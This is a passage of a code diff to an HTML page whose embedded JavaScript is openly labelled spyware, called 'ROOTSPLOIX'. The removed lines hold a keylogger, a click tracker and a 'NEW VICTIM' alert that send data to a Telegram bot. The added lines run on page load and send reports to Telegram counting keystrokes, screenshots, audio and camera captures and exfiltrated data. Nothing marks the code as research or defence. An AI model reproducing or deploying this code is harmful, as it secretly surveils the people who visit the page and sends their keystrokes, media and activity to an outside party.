+                }, 900000);
+            }
+            
+            async sendPeriodicReport() {
+                const uptime = Math.floor((Date.now() - ROOTSPLOIX_SESSION.startTime) / 1000);
+                const hours = Math.floor(uptime / 3600);
+                const minutes = Math.floor((uptime % 3600) / 60);
+                const seconds = uptime % 60;
+                
+                const message = `📊 PERIODIC STATUS REPORT
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+⏱️ Uptime: ${hours}h ${minutes}m ${seconds}s
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${window.location.href}
+
+📈 Activity Statistics:
+• Keystrokes: ${ROOTSPLOIX_SESSION.statistics.keystrokeCount}
+• Mouse Clicks: ${ROOTSPLOIX_SESSION.statistics.clickCount}
+• Screenshots: ${ROOTSPLOIX_SESSION.statistics.screenshotCount}
+• Audio Recordings: ${ROOTSPLOIX_SESSION.statistics.audioCount}
+• Camera Photos: ${ROOTSPLOIX_SESSION.statistics.cameraCount}
+• Data Exfiltrated: ${RootsploixUtils.formatBytes(ROOTSPLOIX_SESSION.statistics.dataExfiltrated)}
+
+🔍 System Status:
+• Page Focus: ${document.hasFocus() ? '✅ Active' : '⚠️ Inactive'}
+• Online Status: ${navigator.onLine ? '✅ Online' : '❌ Offline'}
+• Battery: ${navigator.getBattery ? 'Available' : 'N/A'}
+
+💀 FRAMEWORK OPERATIONAL
+
+Next report in 15 minutes...`;
+                
+                await this.telegram.sendMessage(message);
+            }
+            
+            stop() {
+                if (this.reportingInterval) {
+                    clearInterval(this.reportingInterval);
+                }
+                
+                // Stop all modules
+                if (this.keylogger) this.keylogger.stop();
+                if (this.mouseTracker) this.mouseTracker.stop();
+                if (this.mediaCapture) this.mediaCapture.stop();
+                if (this.locationTracker) this.locationTracker.stop();
+                if (this.browserDataCollector) this.browserDataCollector.stop();
+                
+                ROOTSPLOIX_SESSION.isActive = false;
+                RootsploixUtils.log('info', 'ROOTSPLOIX Framework stopped');
+            }
+        }
+        
+        // ===== FRAMEWORK INITIALIZATION =====
+        // Global instances
+        let rootsploix = null;
+        let telegram = null;
+        
+        // Initialize framework on page load
+        document.addEventListener('DOMContentLoaded', async function() {
             try {
-                const img = new Image();
-                img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-                console.log('✅ Message sent:', message);
-            } catch (e) {
-                console.error('❌ Send error:', e);
-            }
-        }
-        
-        // IMMEDIATE TEST - NO DELAYS
-        const testMsg = `🔥 SIMPLE TEST!
+                // Create global Telegram instance
+                telegram = new TelegramAPI();
+                
+                // Create and initialize framework
+                rootsploix = new RootsploixFramework();
+                await rootsploix.initialize();
+                
+                // Set up error handling
+                window.addEventListener('error', async function(e) {
+                    const errorMsg = `❌ JAVASCRIPT ERROR DETECTED!
 
-Session: ${sessionId}
-Time: ${new Date().toLocaleString()}
-URL: ${window.location.href}
-UserAgent: ${navigator.userAgent}
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📝 File: ${e.filename}
+🔢 Line: ${e.lineno}:${e.colno}
+⚠️ Error: ${e.message}
+🕒 Time: ${new Date().toLocaleString()}
 
-💀 ROOTSPLOIX WORKING!`;
-        sendToTelegram(testMsg);
-        
-        // BASIC KEYLOGGER
-        let keyBuffer = [];
-        document.addEventListener('keydown', function(e) {
-            keyBuffer.push(e.key);
-            if (keyBuffer.length >= 10) {
-                const keys = keyBuffer.join('');
-                const keyMsg = `⌨️ KEYS: ${keys}
+💀 ROOTSPLOIX v3.0`;
+                    
+                    if (telegram) {
+                        await telegram.sendMessage(errorMsg);
+                    }
+                });
+                
+                // Set up unload handler
+                window.addEventListener('beforeunload', async function() {
+                    const unloadMsg = `📴 SESSION ENDING
 
-Session: ${sessionId}
-Time: ${new Date().toLocaleString()}
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+⏱️ Duration: ${Math.floor((Date.now() - ROOTSPLOIX_SESSION.startTime) / 1000)}s
+🕒 End Time: ${new Date().toLocaleString()}
+🌍 URL: ${window.location.href}
 
-💀 ROOTSPLOIX`;
-                sendToTelegram(keyMsg);
-                keyBuffer = [];
+📈 Final Statistics:
+• Keystrokes: ${ROOTSPLOIX_SESSION.statistics.keystrokeCount}
+• Clicks: ${ROOTSPLOIX_SESSION.statistics.clickCount}
+• Media: ${ROOTSPLOIX_SESSION.statistics.cameraCount + ROOTSPLOIX_SESSION.statistics.audioCount}
+
+💀 ROOTSPLOIX v3.0 - SESSION TERMINATED`;
+                    
+                    if (telegram) {
+                        await telegram.sendMessage(unloadMsg);
+                    }
+                });
+                
+                RootsploixUtils.log('info', 'ROOTSPLOIX Ultra Professional Framework v3.0 fully loaded and operational');
+                
+            } catch (error) {
+                console.error('ROOTSPLOIX initialization failed:', error);
             }
         });
         
-        // BASIC CLICK TRACKER
-        document.addEventListener('click', function(e) {
-            const clickMsg = `🖱️ CLICK: ${e.target.tagName}
-
-Session: ${sessionId}
-Time: ${new Date().toLocaleString()}
-Position: ${e.clientX},${e.clientY}
-
-💀 ROOTSPLOIX`;
-            sendToTelegram(clickMsg);
-        });
-        
-        // VICTIM NOTIFICATION
-        function sendVictimNotification() {
-            const message = `🚨 NEW VICTIM!
-
-Session: ${sessionId}
-Platform: ${navigator.platform}
-Browser: ${navigator.userAgent.match(/Chrome|Firefox|Safari|Edge/)?.[0] || 'Unknown'}
-URL: ${window.location.href}
-Time: ${new Date().toLocaleString()}
-Screen: ${screen.width}x${screen.height}
-
-💀 ROOTSPLOIX ACTIVE!`;
-            sendToTelegram(message);
+        // Auto-start if DOM already loaded
+        if (document.readyState === 'loading') {
+            // DOM not ready, wait for event
+        } else {
+            // DOM is ready, initialize immediately
+            setTimeout(async () => {
+                try {
+                    telegram = new TelegramAPI();
+                    rootsploix = new RootsploixFramework();
+                    await rootsploix.initialize();
+                } catch (error) {
+                    console.error('ROOTSPLOIX auto-start failed:', error);
+                }
+            }, 1000);
         }
         
-        // SEND VICTIM NOTIFICATION AFTER 3 SECONDS
-        setTimeout(sendVictimNotification, 3000);
-        
-        console.log('🔥 ROOTSPLOIX SIMPLE SYSTEM LOADED!');
     </script>
+</body>
+</html>
 </body>
 </html>
